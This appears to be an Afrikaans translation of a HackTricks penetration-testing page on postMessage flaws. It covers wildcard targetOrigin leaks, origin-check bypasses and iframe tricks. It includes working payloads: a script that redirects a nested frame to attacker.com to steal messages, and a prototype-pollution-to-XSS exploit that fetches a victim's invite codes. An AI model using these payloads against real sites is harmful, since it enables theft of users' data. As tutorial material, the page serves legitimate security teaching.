# PostMessage Kw vulnerabilities

{{#include ../../banners/hacktricks-training.md}}

## Stuur **PostMessage**

**PostMessage** gebruik die volgende funksie om 'n boodskap te stuur:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Let wel dat **targetOrigin** 'n '\*' of 'n URL soos _https://company.com._ kan wees.\
In die **tweede scenario** kan die **boodskap slegs na daardie domein gestuur word** (selfs al is die oorsprong van die venster objek anders).\
As die **wildcard** gebruik word, kan **boodskappe na enige domein gestuur word**, en sal dit na die oorsprong van die Window objek gestuur word.

### Aanval op iframe & wildcard in **targetOrigin**

Soos verduidelik in [**hierdie verslag**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), as jy 'n bladsy vind wat **iframed** kan word (geen `X-Frame-Header` beskerming nie) en wat **sensitiewe** boodskap via **postMessage** met 'n **wildcard** (\*) stuur, kan jy die **oorsprong** van die **iframe** **wysig** en die **sensitiewe** boodskap na 'n domein wat deur jou beheer word **lek**.\
Let wel dat as die bladsy iframed kan word, maar die **targetOrigin** **op 'n URL en nie op 'n wildcard** gestel is nie, hierdie **truuk sal nie werk**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener uitbuiting

**`addEventListener`** is die funksie wat deur JS gebruik word om die funksie te verklaar wat **`postMessages`** **verwag**.\
'n Kode soortgelyk aan die volgende een sal gebruik word:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Let wel in hierdie geval hoe die **eerste ding** wat die kode doen is **om die oorsprong te kontroleer**. Dit is vreeslik **belangrik**, veral as die bladsy **enigiets sensitiefs** met die ontvangde inligting gaan doen (soos om 'n wagwoord te verander). **As dit nie die oorsprong kontroleer nie, kan aanvallers slagoffers dwing om arbitrêre data na hierdie eindpunte te stuur** en die slagoffers se wagwoorde te verander (in hierdie voorbeeld).

### Enumerasie

Om **gebeurtenisluisteraars** in die huidige bladsy te **vind**, kan jy:

- **Soek** die JS-kode vir `window.addEventListener` en `$(window).on` (_JQuery weergawe_)
- **Voer** in die ontwikkelaarstoele console uit: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gaan na** _Elements --> Event Listeners_ in die ontwikkelaarstoele van die blaaier

![](<../../images/image (396).png>)

- Gebruik 'n **blaaier uitbreiding** soos [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) of [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Hierdie blaaier uitbreidings sal **alle boodskappe onderskep** en dit aan jou wys.

### Oorsprong kontroleer omseilings

- **`event.isTrusted`** attribuut word as veilig beskou aangesien dit `True` slegs teruggee vir gebeurtenisse wat deur werklike gebruikersaksies gegenereer word. Alhoewel dit uitdagend is om te omseil as dit korrek geïmplementeer is, is die belangrikheid daarvan in sekuriteitskontroles noemenswaardig.
- Die gebruik van **`indexOf()`** vir oorsprong validasie in PostMessage gebeurtenisse mag vatbaar wees vir omseilings. 'n Voorbeeld wat hierdie kwesbaarheid illustreer is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`** metode van `String.prototype.search()` is bedoel vir gereelde uitdrukkings, nie strings nie. Om enigiets anders as 'n regexp deur te gee lei tot implisiete omskakeling na regex, wat die metode potensieel onveilig maak. Dit is omdat in regex, 'n punt (.) as 'n wildcard optree, wat omseiling van validasie met spesiaal saamgestelde domeine moontlik maak. Byvoorbeeld:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`** funksie, soortgelyk aan `search()`, verwerk regex. As die regex verkeerd gestruktureer is, mag dit vatbaar wees vir omseilings.
- Die **`escapeHtml`** funksie is bedoel om insette te saniteer deur karakters te ontsnap. Dit skep egter nie 'n nuwe ontsnapte objek nie, maar oorskryf die eienskappe van die bestaande objek. Hierdie gedrag kan uitgebuit word. Veral, as 'n objek gemanipuleer kan word sodat sy beheerde eienskap nie `hasOwnProperty` erken nie, sal die `escapeHtml` nie soos verwag werk nie. Dit word in die voorbeelde hieronder gedemonstreer:

- Verwachte Faal:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Omseiling van die ontsnapping:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In die konteks van hierdie kwesbaarheid is die `File` objek merkwaardig uitbuitbaar weens sy leesbare `name` eienskap. Hierdie eienskap, wanneer in sjablone gebruik, word nie deur die `escapeHtml` funksie gesaniteer nie, wat tot potensiële sekuriteitsrisiko's lei.

- Die `document.domain` eienskap in JavaScript kan deur 'n skrip gestel word om die domein te verkort, wat 'n meer ontspanne same oorsprong beleid afdwinging binne die selfde ouer domein moontlik maak.

### e.origin == window.origin omseiling

Wanneer 'n webblad binne 'n **sandboxed iframe** ingebed word met %%%%%%, is dit belangrik om te verstaan dat die iframe se oorsprong op null gestel sal word. Dit is veral belangrik wanneer daar met **sandbox eienskappe** en hul implikasies op sekuriteit en funksionaliteit gewerk word.

Deur **`allow-popups`** in die sandbox eienskap te spesifiseer, erf enige pop-up venster wat vanuit die iframe geopen word die sandbox beperkings van sy ouer. Dit beteken dat tensy die **`allow-popups-to-escape-sandbox`** eienskap ook ingesluit is, die pop-up venster se oorsprong ook op `null` gestel word, wat ooreenstem met die iframe se oorsprong.

Gevolglik, wanneer 'n pop-up onder hierdie omstandighede geopen word en 'n boodskap van die iframe na die pop-up gestuur word met **`postMessage`**, het beide die sending en ontvangende kante hul oorspronge op `null` gestel. Hierdie situasie lei tot 'n scenario waar **`e.origin == window.origin`** waar is (`null == null`), omdat beide die iframe en die pop-up die selfde oorsprong waarde van `null` deel.

Vir meer inligting **lees**:

{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Omseiling van e.source

Dit is moontlik om te kontroleer of die boodskap van dieselfde venster kom waarin die skrip luister (spesiaal interessant vir **Inhoud Skrifte van blaaier uitbreidings** om te kontroleer of die boodskap van dieselfde bladsy gestuur is):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
U kan **`e.source`** van 'n boodskap dwing om null te wees deur 'n **iframe** te skep wat die **postMessage** **stuur** en **onmiddellik verwyder** word.

Vir meer inligting **lees:**

{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header omseiling

Om hierdie aanvalle uit te voer, sal jy idealiter in staat wees om die **slagoffer webblad** binne 'n `iframe` te plaas. Maar sommige headers soos `X-Frame-Header` kan daardie **gedrag** **voorkom**.\
In daardie scenario's kan jy steeds 'n minder stealthy aanval gebruik. Jy kan 'n nuwe oortjie oopmaak na die kwesbare webtoepassing en met dit kommunikeer:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Diefstal van boodskap wat na kind gestuur is deur die hoofblad te blokkeer

In die volgende bladsy kan jy sien hoe jy 'n **sensitiewe postmessage data** wat na 'n **kind iframe** gestuur is, kan steel deur die **hoof** blad te **blokkeer** voordat die data gestuur word en 'n **XSS in die kind** te **misbruik** om die data te **lek** voordat dit ontvang word:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Diefstal van boodskap deur iframe ligging te verander

As jy 'n webblad kan iframe sonder X-Frame-Header wat 'n ander iframe bevat, kan jy die **ligging van daardie kind iframe** **verander**, so as dit 'n **postmessage** ontvang wat met 'n **wildcard** gestuur is, kan 'n aanvaller daardie iframe **oorsprong** na 'n bladsy **onder sy beheer** **verander** en die boodskap **steel**:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage na Prototype Pollution en/of XSS

In scenario's waar die data wat deur `postMessage` gestuur word, deur JS uitgevoer word, kan jy die **bladsy** **iframe** en die **prototype pollution/XSS** **misbruik** deur die eksploiet via `postMessage` te stuur.

'n Paar **baie goed verduidelikde XSS deur `postMessage`** kan gevind word in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Voorbeeld van 'n eksploiet om **Prototype Pollution en dan XSS** deur 'n `postMessage` na 'n `iframe` te misbruik:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Vir **meer inligting**:

- Skakel na bladsy oor [**prototype besoedeling**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Skakel na bladsy oor [**XSS**](../xss-cross-site-scripting/index.html)
- Skakel na bladsy oor [**klantkant prototype besoedeling na XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

## Verwysings

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Om te oefen: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

{{#include ../../banners/hacktricks-training.md}}
